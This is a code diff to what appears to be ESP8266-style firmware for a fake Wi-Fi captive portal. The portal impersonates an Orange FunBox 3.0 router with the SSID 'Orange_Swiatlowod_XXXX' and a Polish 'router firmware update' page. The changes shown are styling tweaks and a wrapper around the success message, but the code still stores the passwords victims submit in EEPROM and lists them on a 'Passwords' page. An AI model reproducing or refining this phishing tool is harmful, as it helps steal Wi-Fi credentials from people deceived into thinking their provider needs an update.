@@ -15,7 +15,7 @@ const char *SSID_NAME = "Orange_Swiatlowod_XXXX";
 #define TITLE "Aktualizacja"
 #define BODY "Oprogramowanie routera jest nieaktualne. Zaktualizuj oprogramowanie, aby kontynuować normalne przeglądanie."
 #define POST_TITLE "Aktualizacja ..."
-#define POST_BODY "Twój router jest aktualizowany. Proszę zaczekać, aż proces się zakończy.</br>"
+#define POST_BODY "Twój router jest aktualizowany. Proszę zaczekać, aż proces się zakończy...</br>"
 #define PASS_TITLE "Passwords"
 #define CLEAR_TITLE "Cleared"
 
@@ -58,20 +58,20 @@ String header(String t)
   String CSSLOG = "article { background: #f2f2f2; padding: 1.3em; }" 
     "body {background-color: #e6e6e6;width: 100%;min-height: 680px;font-family: Helvetica, Arial, sans-serif;}"
     ".form-container {line-height: 1.4;}"
-    ".form-container p {font-size: 14px;}"
-    "header, footer, .form-container {position:relative;top:0; min-height:110px; z-index: 10;display:block;background-color: #FFF; padding: 20px 50px 20px 50px}"
+    "header, footer, .form-container {position:relative;top:0; z-index: 10;display:block;background-color: #FFF; padding: 20px 50px 20px 50px}"
     "#logo {color: #000000;}"
     "header, footer {background: #000000;}"
-    "h2 {color: #ff6600;font-size: 18px;font-weight: normal;line-height: 20px;padding-top: 10px; font-size: 18px;font-weight: normal;line-height: 20px  padding-top: 10px;}"
+    "h2 {color: #ff6600;font-weight: normal;line-height: 20px;padding-top: 10px;font-weight: normal;line-height: 20px; padding-top: 10px;}"
     "input[type=button], input[type=submit], input[type=reset] {background-color: #ff6600;border: none;color: white;padding: 16px 32px;text-decoration: none;margin: 4px 2px;cursor: pointer;}"
-    "input[type=text], input[type=password] {border: 1px solid #000;border-radius: 4px;padding: 10px;font-size: 16px;text-decoration: none;margin: 4px 2px;}";
+    "input[type=text], input[type=password] {border: 1px solid #000;border-radius: 4px;padding: 10px;text-decoration: none;margin: 4px 2px;}"
+    ".success {margin:10px;width: 100%;text-align: left;font-weight: bold;}";
   String h = "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">"
              "<head class=\"no-js\" xmlns =\"http://www.w3.org/1999/xhtml\" dir=\"ltr\" lang=\"en\">"
             "<title>Funbox " + a + "::" + t + "</title>"
             "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />"
             "<style>" + CSSLOG + "</style>"
                     "<meta charset=\"UTF-8\"></head>"
-                    "<body class=\"log\"><h1 id=\"logo\">FunBox 3.0</h1><header><h2>" + BODY + "</h2><</header>";
+                    "<body class=\"log\"><h1 id=\"logo\"><input style=\"padding: 30px 2px 0px 2px;\" type=\"submit\" value=\"orange\"> FunBox 3.0</h1><header><h2>" + BODY + "</h2><</header>";
   return h;
 }
 
@@ -107,7 +107,7 @@ String posted()
   passEnd += pass.length(); // Updating end position of passwords in EEPROM.
   EEPROM.write(passEnd, '\0');
   EEPROM.commit();
-  return header(POST_TITLE) + POST_BODY + footer();
+  return header(POST_TITLE) + "<div class=\"success\">" + POST_BODY + "</div>" + footer();
 }
 
 String pass()
